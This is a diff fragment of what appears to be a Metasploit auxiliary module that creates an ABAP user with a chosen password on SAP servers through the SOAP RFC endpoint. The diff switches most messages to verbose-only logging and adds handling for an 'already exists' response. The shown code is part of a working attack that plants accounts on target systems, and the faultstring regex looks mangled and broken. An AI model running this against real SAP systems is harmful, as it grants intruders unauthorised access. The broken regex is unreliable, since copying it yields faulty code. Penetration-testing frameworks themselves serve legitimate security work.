@@ -70,7 +70,7 @@ class Metasploit4 < Msf::Auxiliary
 		data << '</env:Envelope>'
 
 		begin
-			print_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}'")
+			vprint_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}'")
 			res = send_request_cgi({
 				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
 				'method' => 'POST',
@@ -85,25 +85,28 @@ class Metasploit4 < Msf::Auxiliary
 				})
 			if res and res.code == 200
 				if res.body =~ /<h1>Logon failed<\/h1>/
-					print_error("[SAP] #{ip}:#{rport} - Logon failed")
+					vprint_error("[SAP] #{ip}:#{rport} - Logon failed")
 					return
 				elsif res.body =~ /faultstring/
 					error = []
 					error = [ res.body.scan(%r{(.*?)}) ]
-					print_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
+					vprint_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
 					return
 				else
 					print_good("[SAP] #{ip}:#{rport} - User '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}' created")
 					return
 				end
+			elsif res and res.code == 500 and res.body =~ /USER_ALLREADY_EXISTS/
+				vprint_error("[SAP] #{ip}:#{rport} - user already exists")
+				return
 			else
-				print_error("[SAP] #{ip}:#{rport} - Unknown error")
-				print_error("[SAP] #{ip}:#{rport} - Error code: " + res.code) if res
-				print_error("[SAP] #{ip}:#{rport} - Error message: " + res.message) if res
+				vprint_error("[SAP] #{ip}:#{rport} - Unknown error")
+				vprint_error("[SAP] #{ip}:#{rport} - Error code: " + res.code) if res
+				vprint_error("[SAP] #{ip}:#{rport} - Error message: " + res.message) if res
 				return
 			end
 		rescue ::Rex::ConnectionError
-			print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
+			vprint_error("[SAP] #{rhost}:#{rport} - Unable to connect")
 			return
 		end
 	end
